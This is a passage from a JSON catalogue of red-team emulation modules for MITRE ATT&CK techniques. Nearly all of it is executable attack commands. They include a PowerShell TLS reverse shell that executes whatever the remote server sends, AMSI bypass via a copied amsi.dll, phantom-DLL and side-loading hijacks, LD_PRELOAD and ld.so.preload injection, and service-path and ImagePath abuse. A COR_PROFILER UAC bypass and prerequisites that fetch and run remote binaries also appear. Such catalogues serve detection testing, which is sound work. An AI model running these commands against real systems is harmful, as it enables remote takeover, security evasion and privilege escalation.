        {
          "name": "download_url",
          "description": "link to download devtunnel",
          "type": "string",
          "default_value": "https://aka.ms/TunnelsCliDownload/linux-x64"
        },
        {
          "name": "binary_path",
          "description": "path to download devtunnel",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/../ExternalPayloads/devtunnel"
        }
      ],
      "prerequisites": [
        {
          "description": "Download devtunnel\n",
          "check_command": "test -f #{binary_path}\n",
          "install_command": "mkdir -p $(dirname #{binary_path})\ncurl -L \"#{download_url}\" -o \"#{binary_path}\"\nchmod +x #{binary_path}\n"
        },
        {
          "description": "Login to Microsoft Dev tunnels\n",
          "check_command": "#{binary_path} user show | grep -q \"Not logged in\" && exit 1 || exit 0\n",
          "install_command": "echo \"Login to devtunnel using the following command: #{binary_path} user login\"\n"
        }
      ],
      "rx_module_id": "9f94a112-1ce2-464d-a63b-83c1f465f801",
      "module_name": "Microsoft Dev tunnels (Linux/macOS)"
    },
    {
      "index": 1691,
      "technique_id": "T1572",
      "technique_name": "Protocol Tunneling",
      "description": "Visual Studio Code Remote Tunnels can be used for exposing local development environment/services/files over the internet.\nThis raglox will generate a dev tunnel binding it to the local service running on the provided port.\nReference:\n- [Microsoft Docs](https://code.visualstudio.com/docs/remote/tunnels)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/vscode-server/)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &\n",
        "elevation_required": false,
        "cleanup_command": "pkill -9 tunnel\ncode tunnel unregister\ncode tunnel user logout\n"
      },
      "variables": [
        {
          "name": "artifact_base_url",
          "description": "Base URL to download code-cli",
          "type": "string",
          "default_value": "https://code.visualstudio.com/sha/download"
        },
        {
          "name": "artifact_build",
          "description": "build to download - Allowed values (stable/insiders)",
          "type": "string",
          "default_value": "stable"
        },
        {
          "name": "payload_path",
          "description": "path to download code-cli",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/../ExternalPayloads"
        },
        {
          "name": "additional_args",
          "description": "additional arguments to pass to code tunnel",
          "type": "string",
          "default_value": ""
        }
      ],
      "prerequisites": [
        {
          "description": "Install code-cli\n",
          "check_command": "which code\n",
          "install_command": "ARCH_SUFFIX=$(uname -m | grep -q \"arm64\\|aarch64\" && echo \"arm64\" || echo \"x64\")\nif [ \"$(uname)\" = \"Darwin\" ]\nthen brew install code-cli\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen mkdir -p $(dirname #{payload_path})        \n  PKG_TYPE=$(command -v apt >/dev/null && echo \"deb\" || echo \"rpm\")\n  curl -L \"#{artifact_base_url}?build=#{artifact_build}&os=linux-${PKG_TYPE}-${ARCH_SUFFIX}\" -o \"#{payload_path}/code.${PKG_TYPE}\"\n  (which apt && apt install -y \"#{payload_path}/code.${PKG_TYPE}\") || (which yum && yum install -y \"#{payload_path}/code.${PKG_TYPE}\")\n  rm \"#{payload_path}/code.${PKG_TYPE}\"\nfi\n"
        },
        {
          "description": "Login to VSCode Dev tunnels\n",
          "check_command": "code tunnel user show | grep -q \"not logged in\" && exit 1 || exit 0\n",
          "install_command": "echo \"Login to code tunnel using the following command: code tunnel user login\"\n"
        }
      ],
      "rx_module_id": "b877943f-0377-44f4-8477-f79db7f07c4d",
      "module_name": "VSCode tunnels (Linux/macOS)"
    },
    {
      "index": 1692,
      "technique_id": "T1572",
      "technique_name": "Protocol Tunneling",
      "description": "Cloudflared can be used for exposing local development environment/services/files over the internet.\nThis raglox will generate a dev tunnel binding it to the local service running on the provided port.\nReference:\n- [Cloudflared Docs](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/)\n- [LOT Tunnels](https://lottunnels.github.io/lottunnels/Binaries/cloudflared/)\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &\n",
        "elevation_required": false,
        "cleanup_command": "pkill -9 $(basename \"#{binary_path}\")\nrm -f \"#{binary_path}\"\n"
      },
      "variables": [
        {
          "name": "cloudflared_artifact_base_url",
          "description": "Base URL to download cloudflared",
          "type": "string",
          "default_value": "https://github.com/cloudflare/cloudflared/releases/latest/download"
        },
        {
          "name": "binary_path",
          "description": "path to download cloudflared",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/../ExternalPayloads/cloudflared"
        },
        {
          "name": "url_to_tunnel",
          "description": "IP and port to expose",
          "type": "string",
          "default_value": "localhost:8080"
        },
        {
          "name": "additional_args",
          "description": "Additional arguments to pass to cloudflared",
          "type": "string",
          "default_value": ""
        }
      ],
      "prerequisites": [
        {
          "description": "Download cloudflared\n",
          "check_command": "test -f \"#{binary_path}\" && exit 0 || exit 1\n",
          "install_command": "ARCH_SUFFIX=$(uname -m | grep -q \"arm64\\|aarch64\" && echo \"arm64\" || echo \"amd64\")\nif [ \"$(uname)\" = \"Darwin\" ]\nthen curl -L \"#{cloudflared_artifact_base_url}/cloudflared-darwin-${ARCH_SUFFIX}.tgz\" -o \"$(dirname #{binary_path})/cloudflared-darwin-${ARCH_SUFFIX}.tgz\" \n  cd \"$(dirname #{binary_path})\"\n  tar -xzf \"cloudflared-darwin-${ARCH_SUFFIX}.tgz\"\n  rm -f \"cloudflared-darwin-${ARCH_SUFFIX}.tgz\"\n  chmod +x \"#{binary_path}\"\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen mkdir -p $(dirname #{binary_path})\n  curl -L \"#{cloudflared_artifact_base_url}/cloudflared-linux-${ARCH_SUFFIX}\" -o \"#{binary_path}\"\n  chmod +x \"#{binary_path}\"\nfi\n"
        }
      ],
      "rx_module_id": "228c336a-2f79-4043-8aef-bfa453a611d5",
      "module_name": "Cloudflare tunnels (Linux/macOS)"
    },
    {
      "index": 1693,
      "technique_id": "T1573",
      "technique_name": "Encrypted Channel",
      "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "server_ip",
          "description": "IP of the external server",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "server_port",
          "description": "The port to connect to on the external server",
          "type": "string",
          "default_value": "443"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "21caf58e-87ad-440c-a6b8-3ac259964003",
      "module_name": "OpenSSL C2"
    },
    {
      "index": 1694,
      "technique_id": "T1574.001",
      "technique_name": "Hijack Execution Flow: DLL",
      "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe\ncopy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\n%APPDATA%\\updater.exe -Command exit\n",
        "elevation_required": true,
        "cleanup_command": "del %APPDATA%\\updater.exe >nul 2>&1\ndel %APPDATA%\\amsi.dll >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3",
      "module_name": "DLL Search Order Hijacking - amsi.dll"
    },
    {
      "index": 1695,
      "technique_id": "T1574.001",
      "technique_name": "Hijack Execution Flow: DLL",
      "description": ".NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS\nSetting the environmental variable and dropping the phantom WinAppXRT.dll in e.g. c:\\windows\\system32 (or any other location accessible via PATH) will ensure the \nWinAppXRT.dll is loaded everytime user launches an application using .NET.\n\nUpon successful execution, amsi.dll will be copied and renamed to WinAppXRT.dll and then WinAppXRT.dll will be copied to system32 folder for loading during execution of any .NET application.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll WinAppXRT.dll\ncopy %APPDATA%\\WinAppXRT.dll %windir%\\System32\\WinAppXRT.dll\nreg add \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /t REG_EXPAND_SZ /d \"1\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Environment\" /v APPX_PROCESS /f\ndel %windir%\\System32\\WinAppXRT.dll\ndel %APPDATA%\\WinAppXRT.dll\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "46ed938b-c617-429a-88dc-d49b5c9ffedb",
      "module_name": "Phantom Dll Hijacking - WinAppXRT.dll"
    },
    {
      "index": 1696,
      "technique_id": "T1574.001",
      "technique_name": "Hijack Execution Flow: DLL",
      "description": "Re-starting the Print Spooler service leads to C:\\Windows\\System32\\ualapi.dll being loaded\nA malicious ualapi.dll placed in the System32 directory will lead to its execution whenever the system starts\n\nUpon successful execution, amsi.dll will be copied and renamed to ualapi.dll and then ualapi.dll will be copied to system32 folder for loading during system restart.\nPrint Spooler service is also configured to auto start. Reboot of system is required\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll\nren %APPDATA%\\amsi.dll ualapi.dll\ncopy %APPDATA%\\ualapi.dll %windir%\\System32\\ualapi.dll\nsc config Spooler start=auto\n",
        "elevation_required": true,
        "cleanup_command": "del %windir%\\System32\\ualapi.dll\ndel %APPDATA%\\ualapi.dll\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5898902d-c5ad-479a-8545-6f5ab3cfc87f",
      "module_name": "Phantom Dll Hijacking - ualapi.dll"
    },
    {
      "index": 1697,
      "technique_id": "T1574.001",
      "technique_name": "Hijack Execution Flow: DLL",
      "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{gup_executable}\"\n",
        "elevation_required": false,
        "cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "process_name",
          "description": "Name of the created process",
          "type": "string",
          "default_value": "calculator.exe"
        },
        {
          "name": "gup_executable",
          "description": "GUP is an open source signed binary used by Notepad++ for software updates",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1574.002\\bin\\GUP.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Gup.exe binary must exist on disk at specified location (#{gup_executable})\n",
          "check_command": "if (Test-Path \"#{gup_executable}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{gup_executable}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1574.001/bin/GUP.exe?raw=true\" -OutFile \"#{gup_executable}\"\n"
        }
      ],
      "rx_module_id": "65526037-7079-44a9-bda1-2cb624838040",
      "module_name": "DLL Side-Loading using the Notepad++ GUP.exe binary"
    },
    {
      "index": 1698,
      "technique_id": "T1574.001",
      "technique_name": "Hijack Execution Flow: DLL",
      "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "set DOTNET_STARTUP_HOOKS=\"#{preloader_dll}\"\ndotnet -h > nul\necho.\n",
        "elevation_required": false,
        "cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "process_name",
          "description": "Name of the created process",
          "type": "string",
          "default_value": "calculator.exe"
        },
        {
          "name": "preloader_dll",
          "description": "library for interfacing with the dotnet framework",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1574.002\\bin\\preloader.dll"
        }
      ],
      "prerequisites": [
        {
          "description": ".Net SDK must be installed\n",
          "check_command": "if (Test-Path \"C:\\Program Files\\dotnet\\dotnet.exe\") {exit 0} else {exit 1}\n",
          "install_command": "winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null\necho.\n"
        },
        {
          "description": "preloader must exist\n",
          "check_command": "if (Test-Path \"#{preloader_dll}\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1574.001/bin/preloader.dll?raw=true\" -OutFile \"#{preloader_dll}\"\n"
        }
      ],
      "rx_module_id": "d322cdd7-7d60-46e3-9111-648848da7c02",
      "module_name": "DLL Side-Loading using the dotnet startup hook environment variable"
    },
    {
      "index": 1699,
      "technique_id": "T1574.001",
      "technique_name": "Hijack Execution Flow: DLL",
      "description": "Various threat actors and malware have been found side loading a masqueraded \"KeyScramblerIE.dll\" through \"KeyScrambler.exe\", which can load further executables embedded in modified KeyScramblerIE.dll file.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Write-Host 1.Downloading KeyScrambler from official website to temp directory\nInvoke-WebRequest -Uri \"https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe\" -OutFile $env:Temp\\KeyScrambler_Setup.exe\nWrite-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory\nStart-Process -FilePath $env:Temp\\KeyScrambler_Setup.exe -ArgumentList /S -Wait\nWrite-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp\nCopy-Item \"C:\\Program Files (x86)\\KeyScrambler\\KeyScrambler.exe\" -Destination $env:TEMP\\KeyScrambler.exe\nWrite-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup\nStart-Process -FilePath $env:Temp\\KeyScrambler.exe\nWrite-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker",
        "elevation_required": true,
        "cleanup_command": "Write-Host 1.Kindly close the popup window asking for KeyScramblerIE.dll ,so that it gets deleted.\n\nRemove-Item -Path $env:Temp\\KeyScrambler_Setup.exe\nStart-Process -FilePath \"C:\\Program Files (x86)\\KeyScrambler\\Uninstall.exe\" -ArgumentList /S -Wait\nRemove-Item -Path $env:Temp\\KeyScrambler.exe\nWrite-Host 2.KeyScrambler cleanup completed successfully."
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c095ad8e-4469-4d33-be9d-6f6d1fb21585",
      "module_name": "DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE"
    },
    {
      "index": 1700,
      "technique_id": "T1574.006",
      "technique_name": "Hijack Execution Flow: LD_PRELOAD",
      "description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n",
        "elevation_required": true,
        "cleanup_command": "sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload\n"
      },
      "variables": [
        {
          "name": "path_to_shared_library_source",
          "description": "Path to a shared library source code",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1574.006/src/Linux/T1574.006.c"
        },
        {
          "name": "path_to_shared_library",
          "description": "Path to a shared library object",
          "type": "path",
          "default_value": "/tmp/T1574006.so"
        }
      ],
      "prerequisites": [
        {
          "description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n",
          "check_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"
        }
      ],
      "rx_module_id": "39cb0e67-dd0d-4b74-a74b-c072db7ae991",
      "module_name": "Shared Library Injection via /etc/ld.so.preload"
    },
    {
      "index": 1701,
      "technique_id": "T1574.006",
      "technique_name": "Hijack Execution Flow: LD_PRELOAD",
      "description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "LD_PRELOAD=#{path_to_shared_library} ls\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "path_to_shared_library_source",
          "description": "Path to a shared library source code",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1574.006/src/Linux/T1574.006.c"
        },
        {
          "name": "path_to_shared_library",
          "description": "Path to a shared library object",
          "type": "path",
          "default_value": "/tmp/T1574006.so"
        }
      ],
      "prerequisites": [
        {
          "description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n",
          "check_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"
        }
      ],
      "rx_module_id": "bc219ff7-789f-4d51-9142-ecae3397deae",
      "module_name": "Shared Library Injection via LD_PRELOAD"
    },
    {
      "index": 1702,
      "technique_id": "T1574.006",
      "technique_name": "Hijack Execution Flow: LD_PRELOAD",
      "description": "injects a dylib that opens calculator via env variable\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\n",
        "elevation_required": false,
        "cleanup_command": "kill `pgrep Calculator`\nkill `pgrep firefox`\n"
      },
      "variables": [
        {
          "name": "file_to_inject",
          "description": "Path of executable to be injected. Mostly works on non-apple default apps.",
          "type": "path",
          "default_value": "/Applications/Firefox.app/Contents/MacOS/firefox"
        },
        {
          "name": "source_file",
          "description": "Path of c source file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1574.006/src/MacOS/T1574.006.c"
        },
        {
          "name": "dylib_file",
          "description": "Path of dylib file",
          "type": "path",
          "default_value": "/tmp/T1574006MOS.dylib"
        }
      ],
      "prerequisites": [
        {
          "description": "Compile the dylib from (#{source_file}). Destination is #{dylib_file}\n",
          "check_command": "gcc -dynamiclib #{source_file} -o #{dylib_file}\n",
          "install_command": "gcc -dynamiclib #{source_file} -o #{dylib_file}\n"
        }
      ],
      "rx_module_id": "4d66029d-7355-43fd-93a4-b63ba92ea1be",
      "module_name": "Dylib Injection via DYLD_INSERT_LIBRARIES"
    },
    {
      "index": 1703,
      "technique_id": "T1574.008",
      "technique_name": "Hijack Execution Flow: Path Interception by Search Order Hijacking",
      "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToRagloxModulesFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore\nStop-Process -Name \"calculator\"\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1561de08-0b4b-498e-8261-e922f3494aae",
      "module_name": "powerShell Persistence via hijacking default modules - Get-Variable.exe"
    },
    {
      "index": 1704,
      "technique_id": "T1574.009",
      "technique_name": "Hijack Execution Flow: Path Interception by Unquoted Path",
      "description": "When a service is created whose executable path contains spaces and isnt enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy \"#{service_executable}\" \"C:\\Program Files\\windows_service.exe\"\ncopy \"#{service_executable}\" \"C:\\program.exe\"\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\nsc start \"Example Service\"\n",
        "elevation_required": true,
        "cleanup_command": "sc stop \"Example Service\" >nul 2>&1\nsc delete \"Example Service\" >nul 2>&1\ndel \"C:\\Program Files\\windows_service.exe\" >nul 2>&1\ndel \"C:\\program.exe\" >nul 2>&1\ndel \"C:\\Time.log\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "service_executable",
          "description": "Path of the executable used for the service and as the hijacked program.exe",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1574.009\\bin\\WindowsServiceExample.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "2770dea7-c50f-457b-84c4-c40a47460d9f",
      "module_name": "Execution of program.exe as service with unquoted service path"
    },
    {
      "index": 1705,
      "technique_id": "T1574.011",
      "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
      "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"C:\\temp\\RAGLOXRedteam.exe\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name} |FL\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "weak_service_name",
          "description": "weak service check",
          "type": "string",
          "default_value": "weakservicename"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f7536d63-7fd4-466f-89da-7e48d550752a",
      "module_name": "Service Registry Permissions Weakness"
    },
    {
      "index": 1706,
      "technique_id": "T1574.011",
      "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
      "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"#{malicious_service_path}\"\n",
        "elevation_required": false,
        "cleanup_command": "sc.exe delete #{weak_service_name}\n"
      },
      "variables": [
        {
          "name": "weak_service_name",
          "description": "weak service name",
          "type": "string",
          "default_value": "calcservice"
        },
        {
          "name": "weak_service_path",
          "description": "weak service path",
          "type": "string",
          "default_value": "%windir%\\system32\\win32calc.exe"
        },
        {
          "name": "malicious_service_path",
          "description": "malicious service path",
          "type": "string",
          "default_value": "%windir%\\system32\\cmd.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The service must exist (#{weak_service_name})\n",
          "check_command": "if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}\n",
          "install_command": "sc.exe create #{weak_service_name} binpath= \"#{weak_service_path}\"\n"
        }
      ],
      "rx_module_id": "f38e9eea-e1d7-4ba6-b716-584791963827",
      "module_name": "Service ImagePath Change with reg.exe"
    },
    {
      "index": 1707,
      "technique_id": "T1574.012",
      "technique_name": "Hijack Execution Flow: COR_PROFILER",
      "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\#{clsid_guid}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32\" -Value \"#{file_name}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n"
      },
      "variables": [
        {
          "name": "file_name",
          "description": "unmanaged profiler DLL",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1574.012\\bin\\T1574.012x64.dll"
        },
        {
          "name": "clsid_guid",
          "description": "custom clsid guid",
          "type": "string",
          "default_value": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
        }
      ],
      "prerequisites": [
        {
          "description": "\"#{file_name}\" must be present\n",
          "check_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
        }
      ],
      "rx_module_id": "9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a",
      "module_name": "User scope COR_PROFILER"
    },
    {
      "index": 1708,
      "technique_id": "T1574.012",
      "technique_name": "Hijack Execution Flow: COR_PROFILER",
      "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\n",
        "elevation_required": true,
